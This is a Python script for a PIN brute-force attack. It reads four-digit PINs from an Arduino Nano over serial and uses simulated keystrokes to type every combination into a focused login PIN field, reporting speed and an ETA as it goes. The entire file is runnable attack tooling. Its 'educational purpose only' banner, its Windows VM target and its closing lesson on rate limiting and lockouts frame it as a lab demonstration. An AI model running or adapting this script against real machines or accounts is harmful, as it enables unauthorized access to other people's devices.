#!/usr/bin/env python3
"""
Arduino Nano Brute Force Attack
For Windows Host attacking Windows VM
"""

from pynput.keyboard import Controller, Key
import serial
import serial.tools.list_ports
import time
import sys

# ============ CONFIGURATION ============
BAUD_RATE = 9600
DELAY_BETWEEN_DIGITS = 0.15    # Time between typing each digit
DELAY_AFTER_ENTER = 3.0        # Wait time after pressing Enter (Windows needs more time)
# =======================================

def find_arduino():
    """Automatically find Arduino COM port"""
    print("\n[1] 🔍 Searching for Arduino Nano...")
    ports = serial.tools.list_ports.comports()
    
    if not ports:
        print("    ❌ No COM ports found!")
        return None
    
    print("    📋 Available COM ports:")
    for port in ports:
        print(f"       • {port.device} - {port.description}")
        
        # Check if it looks like Arduino
        if any(keyword in port.description.upper() for keyword in ['ARDUINO', 'CH340', 'CH341', 'USB-SERIAL', 'FTDI']):
            print(f"    ✅ Arduino detected on: {port.device}\n")
            return port.device
    
    return None

def manual_port_entry():
    """Let user manually enter COM port"""
    print("\n❓ Arduino not auto-detected.")
    print("   Check Device Manager (Win+X → Device Manager → Ports)")
    print("   Look for 'USB-SERIAL CH340 (COM3)' or similar\n")
    
    port = input("   Enter COM port manually (e.g., COM3): ").strip().upper()
    
    if not port.startswith("COM"):
        port = "COM" + port
    
    return port

def main():
    print("=" * 70)
    print("           ARDUINO NANO BRUTE FORCE - VM ATTACK")
    print("=" * 70)
    print("\n⚠️  EDUCATIONAL PURPOSE ONLY - Test on your own systems!")
    print("   Host: Windows 11 | Target: Windows 10 VM\n")
    
    # Step 1: Find Arduino
    arduino_port = find_arduino()
    
    if not arduino_port:
        arduino_port = manual_port_entry()
    
    # Step 2: Connect to Arduino
    print(f"[2] 🔌 Connecting to {arduino_port}...")
    
    try:
        ser = serial.Serial(arduino_port, BAUD_RATE, timeout=1)
        print(f"    ✅ Connected successfully!")
        print(f"    📊 Baud rate: {BAUD_RATE}\n")
    except serial.SerialException as e:
        print(f"    ❌ Connection failed: {e}")
        print("\n💡 Troubleshooting:")
        print("   1. Is Arduino plugged in?")
        print("   2. Close Arduino IDE (it locks the COM port)")
        print("   3. Check correct COM port in Device Manager")
        print("   4. Try unplugging and replugging Arduino")
        input("\nPress Enter to exit...")
        sys.exit(1)
    
    # Step 3: Wait for Arduino to initialize
    print("[3] ⏳ Waiting for Arduino to initialize...")
    time.sleep(3)
    ser.reset_input_buffer()
    
    # Wait for READY signal from Arduino
    print("    Waiting for READY signal...")
    timeout = time.time() + 10
    
    while time.time() < timeout:
        if ser.in_waiting > 0:
            line = ser.readline().decode('utf-8', errors='ignore').strip()
            if line:
                print(f"    Arduino: {line}")
            if "READY" in line:
                print("    ✅ Arduino is ready!\n")
                break
    
    # Step 4: Initialize keyboard controller
    keyboard = Controller()
    
    # Step 5: Prepare for attack
    print("=" * 70)
    print("                    🎯 ATTACK PREPARATION")
    print("=" * 70)
    print("\n📝 INSTRUCTIONS:")
    print("   1. Make sure your LOGIN PAGE is running")
    print("   2. The LOGIN PAGE should be LOCKED (showing PIN entry screen)")
    print("   3. CLICK on the LOGIN PAGE to give it focus")
    print("   4. CLICK ON THE PIN INPUT FIELD (where you type the PIN)")
    print("   5. You have 10 seconds to do this!\n")
    
    for i in range(10, 0, -1):
        print(f"   ⏰ Starting in {i} seconds... (Click LOGIN PIN field NOW!)", end='\r')
        time.sleep(1)
    
    print("\n\n" + "=" * 70)
    print("                  ⚡ ATTACK IN PROGRESS ⚡")
    print("=" * 70)
    print("\n💡 Press Ctrl+C to stop the attack at any time\n")
    print("-" * 70)
    
    # Step 6: Start brute force
    attempt = 0
    start_time = time.time()
    last_pin = None
    
    try:
        while True:
            # Read from Arduino
            if ser.in_waiting > 0:
                pin = ser.readline().decode('utf-8', errors='ignore').strip()
                
                # Check if complete
                if "COMPLETE" in pin:
                    print("\n\n" + "=" * 70)
                    print("              ✅ ALL PINS TESTED!")
                    print("=" * 70)
                    break
                
                # Validate PIN format (must be 4 digits)
                if pin.isdigit() and len(pin) == 4:
                    attempt += 1
                    elapsed = time.time() - start_time
                    rate = attempt / elapsed if elapsed > 0 else 0
                    remaining = 10000 - attempt
                    eta_seconds = remaining / rate if rate > 0 else 0
                    eta_minutes = eta_seconds / 60
                    
                    # Display progress
                    print(f"[{attempt:05d}] 🔓 Trying PIN: {pin}  |  "
                          f"Speed: {rate:.2f}/sec  |  "
                          f"ETA: {eta_minutes:.1f} min")
                    
                    # Type the PIN digit by digit
                    for digit in pin:
                        keyboard.type(digit)
                        time.sleep(DELAY_BETWEEN_DIGITS)
                    
                    # Press Enter
                    keyboard.press(Key.enter)
                    keyboard.release(Key.enter)
                    
                    # Wait before next attempt
                    time.sleep(DELAY_AFTER_ENTER)
                    
                    last_pin = pin
    
    except KeyboardInterrupt:
        print("\n\n⚠️  ATTACK STOPPED BY USER (Ctrl+C pressed)")
    
    except Exception as e:
        print(f"\n\n❌ ERROR OCCURRED: {e}")
    
    finally:
        # Clean up
        ser.close()
        
        # Display final statistics
        elapsed = time.time() - start_time
        print("\n" + "=" * 70)
        print("                   📊 ATTACK STATISTICS")
        print("=" * 70)
        print(f"   Total attempts:      {attempt:,}")
        print(f"   Last PIN tried:      {last_pin if last_pin else 'N/A'}")
        print(f"   Time elapsed:        {elapsed/60:.2f} minutes ({elapsed:.1f} seconds)")
        print(f"   Average speed:       {attempt/elapsed if elapsed > 0 else 0:.2f} attempts/second")
        print(f"   Remaining PINs:      {10000 - attempt:,}")
        
        if attempt > 0:
            estimated_total = (10000 / attempt) * elapsed / 60
            print(f"   Est. total time:     {estimated_total:.1f} minutes for all 10,000 PINs")
        
        print("=" * 70)
        print("\n💡 Security Lesson: This demonstrates why short PINs are insecure!")
        print("   Defense: Use longer PINs, rate limiting, account lockouts\n")
        
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()